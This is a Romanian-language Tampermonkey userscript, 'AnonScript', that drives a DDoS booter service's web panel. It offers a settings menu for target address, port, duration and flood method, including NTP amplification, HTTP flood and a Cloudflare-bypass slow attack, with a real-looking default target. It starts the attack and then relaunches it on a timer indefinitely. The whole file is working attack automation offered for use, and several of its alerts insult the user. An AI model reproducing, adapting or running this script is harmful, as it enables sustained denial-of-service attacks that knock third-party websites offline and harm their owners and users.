// ==UserScript==
// @name         AnonScript
// @namespace    https://isaidpower.dev
// @version      0.2
// @description  Nu lasa niciodata sclavii in pace, foloseste chiar acum scriptul pentru tampermonkey de la JPN
// @author       JPN
// @match        https://anonboot.com/hub.php
// @require      https://openuserjs.org/src/libs/sizzle/GM_config.js
// @grant        GM_getValue
// @grant        GM_setValue
// @downloadURL https://update.greasyfork.org/scripts/437770/AnonScript.user.js
// @updateURL https://update.greasyfork.org/scripts/437770/AnonScript.meta.js
// ==/UserScript==

(function() {
    'use strict';
    GM_setValue("saved", false);
    console.log("Am retinut faptul ca nu am dat save la setari.");
    GM_config.init({
        'id': 'ANON',
        'title': 'Setari AnonScript',
        'fields': {
            'Layer': {
                'label': 'Alege layeru',
                'section': ['Setari layer', 'Alege dintre layer 4 si layer 7'],
                'type': 'radio',
                'options': ['Layer 4', 'Layer 7'],
                'default': 'Layer 7'
            },
            'Adresa': {
                'label': 'Adresa',
                'section': ['Setari atac', 'Modifica adresa/portul/metoda/timpul atacului'],
                'type': 'text',
                'title': 'IP pentru layer 4 si adresa pentru layer 7',
                'size': 100,
                'default': 'https://allcms.info'
            },
            'Metoda': {
                'label': 'Metoda de atac',
                'type': 'select',
                'options': ['FREE-NTP', 'FREE-FLOOD', 'CLOUDFLARE-SLOW'],
                'default': 'CLOUDFLARE-SLOW'
            },
            'Port': {
                'label': 'Port (layer 4)',
                'type': 'int',
                'min': 1,
                'max': 65535,
                'default': 80
            },
            'Timp': {
                'label': 'Timp',
                'type': 'int',
                'min': 30,
                'max': 300,
                'default': 300
            }
        },
        'events': {
            'save': function() {
                GM_setValue("saved", true);
            },
            'close': function() {
                if (GM_getValue("saved") == false) {
                    alert('Ai uitat sa dai save, imbecilu dracu');
                } else {
                    console.log("Functia start() executata");
                    var interval = (GM_config.get('Timp') * 1000) + 5000;
                    console.log("Intervalul a fost setat");
                    console.log("Intervalul a fost executat");
                        switch (GM_config.get('Layer')) {
                            case 'Layer 4':
                                document.getElementById('layer').value = "4";
                                document.getElementById('layer').click();
                                console.log("Layer 4 setat");
                                document.getElementById('hostl4').value = GM_config.get('Adresa');
                                document.getElementById('portl4').value = GM_config.get('Port');
                                document.getElementById('timel4').value = GM_config.get('Timp');
                                document.getElementById('startl4').click();
                                console.log("L4 pornit");
                                break;
                            case 'Layer 7':
                                document.getElementById('layer').value = "7";
                                document.getElementById('layer').click();
                                console.log("Layer 7 setat");
                                document.getElementById('hostl7').value = GM_config.get('Adresa');
                                document.getElementById('timel7').value = GM_config.get('Timp');
                                switch (GM_config.get('Metoda')) {
                                    case 'FREE-FLOOD':
                                        document.getElementById('methodl7').value = "htflood";
                                        break;
                                    case 'CLOUDFLARE-SLOW':
                                        document.getElementById('methodl7').value = "slowcf";
                                        break;
                                    default:
                                        alert('Ba da prost esti adevarat, ai uitat ca nu poti sa pui altceva ca ai package moca pe anonboot, hai ca iti dau cu cloudflare');
                                        document.getElementById('methodl7').value = "slowcf";
                                        break;
                                }
                                document.getElementById('startl7').click();
                                console.log("L7 pornit");
                                break;
                            default:
                                alert('Configu nu ii bine facut!');
                                break;
                        }
                    setInterval(function() {
                        console.log("Intervalul a fost executat");
                        switch (GM_config.get('Layer')) {
                            case 'Layer 4':
                                document.getElementById('layer').value = "4";
                                document.getElementById('layer').click();
                                console.log("Layer 4 setat");
                                document.getElementById('hostl4').value = GM_config.get('Adresa');
                                document.getElementById('portl4').value = GM_config.get('Port');
                                document.getElementById('timel4').value = GM_config.get('Timp');
                                document.getElementById('startl4').click();
                                console.log("L4 pornit");
                                break;
                            case 'Layer 7':
                                document.getElementById('layer').value = "7";
                                document.getElementById('layer').click();
                                console.log("Layer 7 setat");
                                document.getElementById('hostl7').value = GM_config.get('Adresa');
                                document.getElementById('timel7').value = GM_config.get('Timp');
                                switch (GM_config.get('Metoda')) {
                                    case 'FREE-FLOOD':
                                        document.getElementById('methodl7').value = "htflood";
                                        break;
                                    case 'CLOUDFLARE-SLOW':
                                        document.getElementById('methodl7').value = "slowcf";
                                        break;
                                    default:
                                        alert('Ba da prost esti adevarat, ai uitat ca nu poti sa pui altceva ca ai package moca pe anonboot, hai ca iti dau cu cloudflare');
                                        document.getElementById('methodl7').value = "slowcf";
                                        break;
                                }
                                document.getElementById('startl7').click();
                                console.log("L7 pornit");
                                break;
                            default:
                                alert('Configu nu ii bine facut!');
                                break;
                        }
                    }, interval);
                }
            }
        }
    });
    console.log("Meniul a fost initializat");
    GM_config.open();
    console.log("Meniu deschis");
    alert('Ca sa porneasca script-ul, va trebui sa dai save si dupa close, pentru a opri scriptul dai refresh la pagina sau ii dai disable direct din tampermonkey.');
})();